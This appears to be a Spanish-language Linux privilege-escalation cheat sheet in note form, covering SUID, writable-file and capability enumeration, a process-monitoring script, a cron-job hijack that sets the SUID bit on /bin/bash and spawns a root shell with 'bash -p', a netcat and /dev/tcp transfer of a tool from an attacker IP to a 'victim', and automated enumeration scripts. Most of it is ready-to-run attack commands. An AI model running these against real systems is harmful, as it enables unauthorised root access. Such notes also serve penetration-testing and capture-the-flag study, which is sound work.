-- -
### 🔍 **Detectar Binarios con SUID**
El siguiente comando busca archivos binarios con el bit SUID activo:
```bash
find / -type f -perm /4000 -exec ls -l {} \; 2>/dev/null
```
- **/4000:** Busca archivos con permisos SUID.  

---

### 📝 **Archivos con Permiso de Escritura**
Para identificar archivos que pueden ser escritos por el usuario:
```bash
find / -writable 2>/dev/null
```
- **-writable:** Muestra archivos con permisos de escritura.  

---

### 🐍 **Buscar Archivos Python (Python Library Hijacking)**
Si encontramos archivos Python, podríamos intentar el secuestro de bibliotecas:
```bash
find / -type f -name "*.py" 2>/dev/null
```
- **-name "*.py":** Encuentra archivos con extensión `.py`.  

---

### 🪙 **Buscar Capabilities en Binarios**
Algunas capacidades pueden brindar acceso a escalada de privilegios:
```bash
getcap -r / 2>/dev/null
```
- **-r /:** Recorre todo el sistema en busca de binarios con capabilities.  

---

## ⏳ **Detección y Explotación de Tareas Cron**

### 🕵️ **Script de Detección de Procesos en Ejecución**
El siguiente script detecta procesos nuevos en el sistema:
```bash
#!/bin/bash

old_process=$(ps -eo user,command)

while true; do
    new_process=$(ps -eo user,command)
    diff <(echo "$old_process") <(echo "$new_process") | grep "[\>\<]" | grep -vE "procmon|command|kworker"
    old_process=$new_process
done
```
- **ps -eo user,command:** Muestra los procesos en ejecución con usuario y comando.  
- **diff:** Compara procesos antiguos con los nuevos.  
- **grep "[\>\<]":** Filtra las diferencias entre ambos listados.  

---

### 🚩 **Explotación de Tareas Cron**
Si descubrimos que el usuario root está ejecutando un script mediante una tarea cron, podemos modificarlo para escalar privilegios:
```bash
#!/bin/bash 
sleep 2
chmod u+s /bin/bash
```
- **chmod u+s /bin/bash:** Agrega el bit SUID a bash, permitiendo su ejecución como root.  

#### 💥 **Obtener Bash con Permisos Elevados**
```bash
bash -p
```
- El parámetro `-p` preserva los privilegios SUID.  

---

### 🕵️ **Detección con pspy**
Podemos usar la herramienta **pspy** para detectar procesos ejecutándose como root:
- Repositorio de pspy: [pspy en GitHub](https://github.com/DominicBreuker/pspy)

#### 💻 **Transferencia sin curl ni wget**
Podemos transferir el binario usando netcat:
```bash
# Atacante:
nc -nlvp 443 < pspy
md5sum pspy

# Víctima:
cat < /dev/tcp/192.168.64.128/443 > pspy
md5sum pspy
```
- 💡 **Si los hashes coinciden**, la transferencia fue exitosa.  

---

## 🔧 **Scripts de Enumeración Automática en Linux**

- **LSE (Linux Smart Enumeration)**  
  - Ejecución recomendada:  
    ```bash
    ./lse.sh -l 1
    ```
  - Repositorio: [LSE en GitHub](https://github.com/diego-treitos/linux-smart-enumeration)  

- **LinPEAS**  
  - Escaneo detallado de privilegios en el sistema:  
    ```bash
    ./linpeas.sh
    ```
  - Repositorio: [PEASS-ng en GitHub](https://github.com/carlospolop/PEASS-ng)  

- **Linux Exploit Suggester**  
  - Identifica posibles vulnerabilidades del kernel:  
    ```bash
    perl les.sh
    ```
  - Repositorio: [Linux Exploit Suggester](https://github.com/mzet-/linux-exploit-suggester)  

---

💾 **Guarda esta guía en Obsidian para tener siempre a mano los mejores trucos de escalada de privilegios en Linux!** 🚀